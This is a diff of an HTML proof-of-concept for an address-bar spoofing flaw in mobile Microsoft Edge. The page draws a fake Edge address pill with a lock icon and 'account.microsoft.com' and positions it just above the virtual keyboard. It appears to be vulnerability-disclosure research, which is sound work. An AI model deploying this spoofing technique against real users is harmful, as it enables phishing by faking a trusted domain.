@@ -5,22 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>PoC - Edge Minibar UI Spoofing</title>
   <style>
+    /* Mengembalikan warna konten ke Putih (Light Mode) sesuai kode awal */
     body {
       margin: 0;
       padding: 20px;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #121212; /* Dark background to match screenshot */
-      color: white;
+      background-color: white; 
+      color: black;
     }
 
     button { 
       padding: 12px 18px; 
       font-size: 16px; 
-      background: #0078d4; 
-      color: white; 
-      border: none; 
-      border-radius: 4px;
-      margin-bottom: 10px;
+      margin-right: 10px; 
+      cursor: pointer;
     }
 
     textarea { 
@@ -29,9 +27,7 @@
       padding: 10px; 
       margin-top: 20px; 
       box-sizing: border-box; 
-      background: #1e1e1e;
-      color: white;
-      border: 1px solid #333;
+      border: 1px solid #ccc;
     }
 
     /* FAKE BAR CONTAINER */
@@ -44,9 +40,9 @@
       justify-content: center;
       opacity: 0;
       visibility: hidden;
-      transition: opacity 0.2s ease, bottom 0.1s ease;
+      transition: opacity 0.3s ease, bottom 0.2s ease;
       pointer-events: none;
-      padding-bottom: 8px; /* Offset from keyboard top */
+      padding-bottom: 8px;
     }
 
     .fake-bar.show { 
@@ -54,28 +50,26 @@
       visibility: visible; 
     }
 
-    /* EDGE PILL UI - Berdasarkan Gambar Microsoft Edge */
+    /* EDGE PILL UI - Tetap Dark Mode agar mirip Screenshot */
     .edge-container {
-      background-color: #2b2b2b; /* Warna abu gelap bar */
+      background-color: #2b2b2b; 
       width: 94%;
       height: 58px;
       border-radius: 50px;
       display: flex;
       align-items: center;
       padding: 0 18px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
       box-sizing: border-box;
       position: relative;
     }
 
-    /* Logo Copilot/Edge di Kiri */
     .edge-logo {
       width: 26px;
       height: 26px;
       flex-shrink: 0;
     }
 
-    /* URL & Lock Icon di Tengah */
     .url-content {
       display: flex;
       align-items: center;
@@ -87,7 +81,7 @@
     .lock-icon {
       width: 14px;
       height: 14px;
-      opacity: 0.7;
+      fill: #bbb;
     }
 
     .url-text {
@@ -96,49 +90,51 @@
       letter-spacing: 0.2px;
     }
 
-    /* Refresh Icon di Kanan */
     .refresh-icon {
       width: 22px;
       height: 22px;
-      opacity: 0.9;
+      fill: white;
       flex-shrink: 0;
     }
 
     /* Spacers for scrolling */
     .spacer { height: 800px; }
     .spacer-bottom { height: 1200px; }
-    .bottom-text { font-size: 18px; text-align: center; color: #888; }
+    .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
   </style>
 </head>
 <body>
 
-  <h2>Vulnerability PoC</h2>
-  <p>Scroll down to hide the omnibox, then click the input.</p>
+  <h2>Vulnerability PoC by Francesco Topol</h2>
+  <p>Scroll down to hide the address bar, then tap the textarea.</p>
 
-  <button id="showBtn">Trigger Exploit</button>
-  <textarea id="ta" placeholder="Top input..."></textarea>
+  <button id="showBtn">Show Keyboard</button>
+  <textarea id="ta" placeholder="Textarea at top..."></textarea>
 
   <div class="fake-bar" id="fakeBar">
     <div class="edge-container">
       <img src="https://upload.wikimedia.org/wikipedia/en/a/aa/Microsoft_Copilot_Icon.svg" class="edge-logo">
       
       <div class="url-content">
-        <svg class="lock-icon" viewBox="0 0 24 24" fill="white">
+        <svg class="lock-icon" viewBox="0 0 24 24">
           <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/>
         </svg>
         <span class="url-text">account.microsoft.com</span>
       </div>
 
-      <svg class="refresh-icon" viewBox="0 0 24 24" fill="white">
+      <svg class="refresh-icon" viewBox="0 0 24 24">
         <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
       </svg>
     </div>
   </div>
 
   <div class="spacer"></div>
-  <textarea id="middleTa" placeholder="Middle input..."></textarea>
+  <textarea id="middleTa" placeholder="Textarea in the middle..."></textarea>
   <div class="spacer-bottom"></div>
-  <div class="bottom-text">End of Page</div>
+  
+  <div class="bottom-text">
+    🎉 You finally scrolled down and found this text! 🎉
+  </div>
 
   <script>
     const fakeBar = document.getElementById('fakeBar');
@@ -148,7 +144,6 @@
     function adjustFakeBar() {
       const vv = window.visualViewport;
       if (vv) {
-        // Menghitung posisi tepat di atas keyboard virtual
         const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
         fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
       }
@@ -169,7 +164,6 @@
           adjustFakeBar();
         }
       });
-      window.visualViewport.addEventListener('scroll', adjustFakeBar);
     }
 
     document.getElementById("showBtn").onclick = () => {
